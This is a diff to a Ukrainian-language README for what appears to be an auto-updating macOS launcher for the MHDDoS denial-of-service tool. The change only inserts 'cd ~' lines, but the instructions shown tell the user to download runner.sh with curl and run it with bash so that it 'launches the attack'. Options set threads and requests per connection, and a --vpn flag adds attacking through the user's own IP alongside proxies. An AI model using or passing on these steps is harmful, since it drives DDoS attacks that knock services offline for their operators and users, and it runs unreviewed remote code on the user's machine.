@@ -28,6 +28,7 @@ runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює ці
 ![image](https://user-images.githubusercontent.com/74729549/167318042-f892bec6-7a8b-4ad7-aed1-f625f2e92fd4.png)
 4) Вводимо команду, яка сама завантантажить усе необхідне та запустить атаку (на початку можливо у вас попросить **ваш пароль**, та після цього натиснути Enter, щоб підтвердити встановлення потрібнго пакету (brew))
 ```shell
+cd ~
 curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh
 ```
   
@@ -44,6 +45,7 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runn
 **також можете додавати **3-тим** параметром --debug, що слідкувати за ходом атаки, та **4-тим** параметром --vpn, щоб атакувати ще й через свій ІР разом з проксі**  
 *наприклад команда з 2500 threads 2000 rpc дебагом та доп. атакою через ваш ІР*  
 ```shell
+cd ~
 curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh 2500 2000 --debug --vpn
 ```
 
